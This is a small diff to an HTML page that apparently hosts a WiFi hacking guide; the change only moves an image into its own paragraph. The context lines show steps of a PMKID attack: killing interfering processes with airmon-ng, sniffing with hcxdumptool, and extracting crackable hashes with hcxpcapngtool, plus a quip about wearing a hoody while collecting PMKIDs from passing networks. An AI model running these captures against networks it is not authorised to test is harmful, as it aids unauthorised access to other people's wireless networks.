@@ -2858,8 +2858,8 @@ sudo airmon-ng check-kill
 <h4 id="starting-the-sniffing-with-hcxdumptool"><a class="header" href="#starting-the-sniffing-with-hcxdumptool">Starting the sniffing with hcxdumptool</a></h4>
 <pre><code>sudo hcxdumptool -i wlan1 -o PMKID_CAP1.pcapng --disable_deauthentication --disable_client_attacks --enable_status=3
 </code></pre>
-<p><em>Now wear a hoody, because you will get a PMKID of every network you cross by that is vulnerable to the attack</em>.
-<img src="https://i.imgur.com/hM1pzNY.png" alt="" /></p>
+<p><em>Now wear a hoody, because you will get a PMKID of every network you cross by that is vulnerable to the attack</em>.</p>
+<p><img src="https://i.imgur.com/hM1pzNY.png" alt="" /></p>
 <h2 id="cracking-time"><a class="header" href="#cracking-time">Cracking Time</a></h2>
 <p>Now time for the last part of this sniffing attack, we will extract the hashes from our pcapng capture with the hcxpcapngtool.</p>
 <pre><code>hcxpcapngtool -o Hashes.txt PMKID_CAP1.pcapng
